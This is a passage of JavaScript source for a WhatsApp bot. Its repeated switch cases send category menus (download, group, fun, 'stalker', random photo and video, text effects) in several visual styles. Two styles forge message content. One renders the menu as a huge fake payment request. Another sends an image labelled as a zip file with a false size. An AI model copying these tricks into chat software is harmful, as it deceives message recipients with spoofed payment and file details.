┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the OTHER MENU!* 🌟  
This section contains various useful commands.  

📜 **Available Other Commands:**  
${readmore}\n\n${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'downloadmenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨 📥 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the DOWNLOAD MENU!* 🌟  
This section contains commands for downloading media.  

📜 **Available Download Commands:**  
${readmore}\n\n${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'groupmenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 👥 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the GROUP MENU!* 🌟  
This section contains commands for managing groups.  

📜 **Available Group Commands:**  
${readmore}\n\n${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'funmenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 🎉 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the FUN MENU!* 🌟  
This section contains fun and entertaining commands.  

📜 **Available Fun Commands:**  
${readmore}\n\n${funmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'stalkermenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗦𝗧𝗔𝗟𝗞𝗘𝗥 𝗠𝗘𝗡𝗨 🔎 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the STALKER MENU!* 🌟  
This section contains commands for stalking social media profiles.  

📜 **Available Stalker Commands:**  
${readmore}\n\n${stalkermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'randomphotomenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗥𝗔𝗡𝗗𝗢𝗠 𝗣𝗛𝗢𝗧𝗢 𝗠𝗘𝗡𝗨 📸 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the RANDOM PHOTO MENU!* 🌟  
This section contains commands to get random photos.  

📜 **Available Random Photo Commands:**  
${readmore}\n\n${randphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'randomvideomenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗥𝗔𝗡𝗗𝗢𝗠 𝗩𝗜𝗗𝗘𝗢 𝗠𝗘𝗡𝗨 🎥 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the RANDOM VIDEO MENU!* 🌟  
This section contains commands to get random videos.  

📜 **Available Random Video Commands:**  
${readmore}\n\n${randvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'photooxymenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗣𝗛𝗢𝗧𝗢𝗢𝗫𝗬 𝗠𝗘𝗡𝗨 🖼 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the PHOTOOXY MENU!* 🌟  
This section contains commands to generate cool text effects.  

📜 **Available PhotoOxy Commands:**  
${readmore}\n\n${photooxymenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
